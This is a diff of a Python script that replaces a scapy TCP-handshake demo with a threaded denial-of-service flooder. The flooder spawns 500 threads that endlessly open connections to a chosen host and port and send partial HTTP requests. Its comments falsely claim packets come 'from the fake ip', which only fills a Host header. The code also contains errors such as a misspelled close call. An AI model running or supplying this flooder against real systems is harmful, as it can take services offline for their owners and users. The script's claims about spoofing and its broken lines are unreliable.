@@ -1,27 +1,23 @@
-import sys
-from scapy.all import *
+import threading
+import socket
 
-if len(sys.argv) != 3:
-    print "Usage: ./handshake.py <target-ip> <source-port>"
-    sys.exit(1)
+target = input("please enter the ip: ")
+port = int(input("please enter the port: "))
 
-target = sys.argv[1]
-sp = int(sys.argv[2])
+fake_ip = "10.0.0.1"
 
-i = IP()
-i.dst = target
-print "IP layer prepared: ", i.summary()
+def attack():
+    while True:
+        #create the socket which basically create a packet
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #establish the connection
+        s.connect((target, port))
+        #send the packet to the server
+        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
+        #then send the incomplete packet from the fake ip
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.closr()
 
-t = TCP()
-t.dport = 80
-t.sport = sp
-t.flags = "S"
-print "Sending TCP SYN Packet: ", t.summary()
-ans = sr1(i/t)
-print "Reply was: ",ans.summary()
-
-t.seq = ans.ack
-t.ack = ans.seq + 1
-t.flags = "A"
-print "Sending TCP ACK Packet: ", t.summary()
-ans = sr(i/t/"X")
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
